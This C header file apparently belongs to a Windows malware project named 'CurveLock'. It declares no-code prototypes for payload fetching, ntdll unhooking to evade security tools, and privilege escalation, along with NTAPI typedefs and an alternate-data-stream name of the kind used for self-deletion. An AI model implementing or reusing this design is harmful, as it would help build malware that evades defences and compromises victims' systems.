#pragma once

#include <Windows.h>

// Definitions
#define NEW_STREAM L":CurveLockRandomStream"
#define TMPFILE	L"CurveLock.tmp"
#define STATUS_SUCCESS              0x00000000
#define STATUS_BUFFER_TOO_SMALL     0xC0000023

#define THREAD_INTEGRITY_UNKNOWN   0
#define THREAD_INTEGRITY_LOW       1
#define THREAD_INTEGRITY_MEDIUM    2
#define THREAD_INTEGRITY_HIGH      3

#pragma warning(disable: 4996)

// NTAPI Typedefs
typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
typedef PUCHAR(NTAPI* fnRtlSubAuthorityCountSid)(IN PSID Sid);
typedef PULONG(NTAPI* fnRtlSubAuthoritySid)(IN PSID Sid, IN ULONG SubAuthority);
typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);

//Function protortypes
int fetchPayload();
FARPROC GetProcAddressQ(IN HMODULE hModule, IN LPCSTR lpApiName);
BOOL UnhookNtDLL();
BOOL DoPrivilegeEscalation();